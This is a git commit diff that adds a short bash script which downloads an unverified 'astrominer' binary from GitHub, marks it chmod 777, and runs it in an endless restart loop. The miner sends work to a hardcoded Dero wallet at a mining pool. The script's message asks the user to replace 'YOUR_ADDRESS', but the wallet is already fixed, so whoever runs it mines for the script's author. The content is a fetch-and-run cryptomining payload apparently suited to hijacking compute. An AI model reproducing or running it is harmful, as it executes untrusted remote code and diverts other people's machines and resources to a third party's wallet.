e62aa09c1d053bd3001b087cd80f282fc416315f
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-10-31 23:13:10 +0700

    Update and rename haiyy.sh to haiys.sh

---
+++ haiys.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+wget https://github.com/WxYtzaiu/asekhh/raw/main/astrominer
+chmod 777 astrominer
+
+echo "Replace YOUR_ADDRESS to run the miner"
+while :; do
+    ./astrominer -w deroi1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncq9pvfz92xevuvu8geqh829q3asvh9.ENTE -r stratum+tls://pool.whalesburg.com:4300 -p stratum;
+    sleep 5;
+done
